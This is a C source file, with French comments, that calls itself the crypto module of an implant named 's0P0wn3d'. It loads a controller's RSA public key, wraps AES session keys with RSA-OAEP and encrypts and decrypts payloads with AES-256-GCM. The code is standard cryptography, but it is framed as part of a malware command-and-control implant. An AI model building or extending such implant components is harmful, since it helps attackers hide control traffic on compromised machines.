/*
 * s0P0wn3d — Implémentation du module crypto de l'implant.
 */

#include "crypto.h"
#include "../shared/base64.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

static EVP_PKEY *controller_pubkey = NULL;
static HCRYPTPROV hCryptProv = 0;

int impl_crypto_load_pubkey(const char *pem) {
    BIO *bio = BIO_new_mem_buf(pem, -1);
    if (!bio) return -1;

    controller_pubkey = PEM_read_bio_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);

    if (!controller_pubkey) {
        fprintf(stderr, "[-] Impossible de charger la clé publique\n");
        return -1;
    }

    /* Initialiser le CSP pour la génération de nombres aléatoires */
    CryptAcquireContextA(&hCryptProv, NULL, NULL, PROV_RSA_FULL,
                         CRYPT_VERIFYCONTEXT);

    return 0;
}

void impl_crypto_gen_aes_key(uint8_t *key) {
    if (hCryptProv) {
        CryptGenRandom(hCryptProv, AES_KEY_SIZE, key);
    } else {
        /* Fallback : OpenSSL RAND_bytes */
        RAND_bytes(key, AES_KEY_SIZE);
    }
}

char *impl_crypto_encrypt_aes_key(const uint8_t *aes_key) {
    if (!controller_pubkey) return NULL;

    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(controller_pubkey, NULL);
    if (!ctx) return NULL;

    char *result = NULL;

    if (EVP_PKEY_encrypt_init(ctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0 ||
        EVP_PKEY_CTX_set_rsa_oaep_md(ctx, EVP_sha256()) <= 0 ||
        EVP_PKEY_CTX_set_rsa_mgf1_md(ctx, EVP_sha256()) <= 0) {
        goto cleanup;
    }

    size_t out_len = 0;
    if (EVP_PKEY_encrypt(ctx, NULL, &out_len, aes_key, AES_KEY_SIZE) <= 0) {
        goto cleanup;
    }

    uint8_t *encrypted = malloc(out_len);
    if (!encrypted) goto cleanup;

    if (EVP_PKEY_encrypt(ctx, encrypted, &out_len, aes_key, AES_KEY_SIZE) <= 0) {
        free(encrypted);
        goto cleanup;
    }

    result = base64_encode(encrypted, out_len);
    free(encrypted);

cleanup:
    EVP_PKEY_CTX_free(ctx);
    return result;
}

int impl_crypto_aes_encrypt(const uint8_t *aes_key, const uint8_t *plaintext,
                            size_t pt_len, char **nonce_b64,
                            char **payload_b64, char **tag_b64) {
    uint8_t nonce[AES_NONCE_SIZE];
    uint8_t *ciphertext = malloc(pt_len + 1);
    uint8_t tag[AES_TAG_SIZE];
    if (!ciphertext) return -1;

    /* Générer nonce */
    if (hCryptProv) {
        CryptGenRandom(hCryptProv, AES_NONCE_SIZE, nonce);
    } else {
        RAND_bytes(nonce, AES_NONCE_SIZE);
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { free(ciphertext); return -1; }

    int ret = -1;
    int out_len = 0;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1 ||
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, AES_NONCE_SIZE, NULL) != 1 ||
        EVP_EncryptInit_ex(ctx, NULL, NULL, aes_key, nonce) != 1 ||
        EVP_EncryptUpdate(ctx, ciphertext, &out_len, plaintext, pt_len) != 1) {
        goto cleanup;
    }

    int final_len = 0;
    if (EVP_EncryptFinal_ex(ctx, ciphertext + out_len, &final_len) != 1) {
        goto cleanup;
    }
    out_len += final_len;

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, AES_TAG_SIZE, tag) != 1) {
        goto cleanup;
    }

    *nonce_b64 = base64_encode(nonce, AES_NONCE_SIZE);
    *payload_b64 = base64_encode(ciphertext, out_len);
    *tag_b64 = base64_encode(tag, AES_TAG_SIZE);
    ret = 0;

cleanup:
    EVP_CIPHER_CTX_free(ctx);
    free(ciphertext);
    return ret;
}

int impl_crypto_aes_decrypt(const uint8_t *aes_key, const char *nonce_b64,
                            const char *payload_b64, const char *tag_b64,
                            uint8_t *output, size_t max_out) {
    uint8_t nonce[AES_NONCE_SIZE];
    uint8_t tag[AES_TAG_SIZE];

    size_t nonce_len = base64_decode(nonce_b64, nonce);
    size_t tag_len = base64_decode(tag_b64, tag);
    if (nonce_len != AES_NONCE_SIZE || tag_len != AES_TAG_SIZE)
        return -1;

    size_t ct_len = base64_decoded_len(payload_b64);
    uint8_t *ciphertext = malloc(ct_len);
    if (!ciphertext) return -1;
    size_t ct_actual = base64_decode(payload_b64, ciphertext);

    if (ct_actual > max_out) {
        free(ciphertext);
        return -1;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { free(ciphertext); return -1; }

    int ret = -1;
    int out_len = 0;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1 ||
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, AES_NONCE_SIZE, NULL) != 1 ||
        EVP_DecryptInit_ex(ctx, NULL, NULL, aes_key, nonce) != 1 ||
        EVP_DecryptUpdate(ctx, output, &out_len, ciphertext, ct_actual) != 1) {
        goto cleanup;
    }

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, AES_TAG_SIZE, tag);

    int final_len = 0;
    if (EVP_DecryptFinal_ex(ctx, output + out_len, &final_len) != 1) {
        goto cleanup; /* Auth échouée */
    }
    out_len += final_len;
    ret = out_len;

cleanup:
    EVP_CIPHER_CTX_free(ctx);
    free(ciphertext);
    return ret;
}

void impl_crypto_cleanup(void) {
    if (controller_pubkey) {
        EVP_PKEY_free(controller_pubkey);
        controller_pubkey = NULL;
    }
    if (hCryptProv) {
        CryptReleaseContext(hCryptProv, 0);
        hCryptProv = 0;
    }
}
